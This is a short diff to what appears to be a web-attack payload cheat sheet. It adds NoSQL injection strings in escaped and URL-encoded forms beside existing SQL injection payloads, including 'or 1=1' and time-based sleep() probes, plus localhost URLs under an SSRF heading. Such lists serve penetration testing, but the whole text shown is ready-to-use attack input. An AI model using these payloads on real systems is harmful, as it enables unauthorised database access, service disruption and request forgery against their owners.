@@ -1,4 +1,4 @@
-```
+```sh
 # SQLi
 '
 ' or 1=1-- -
@@ -21,6 +21,10 @@
 1'XOR(if(now()=sysdate(),sleep(3),0))OR'
 "' or sleep(30)='"
 127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))x) AND '1'='1
+# NoSQLi
+\'
+'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+'\"`{\r%3b$Foo}\n$Foo+\\xYZ\u0000
 # SSRF
 http://localhost/
 http://127.0.0.1/
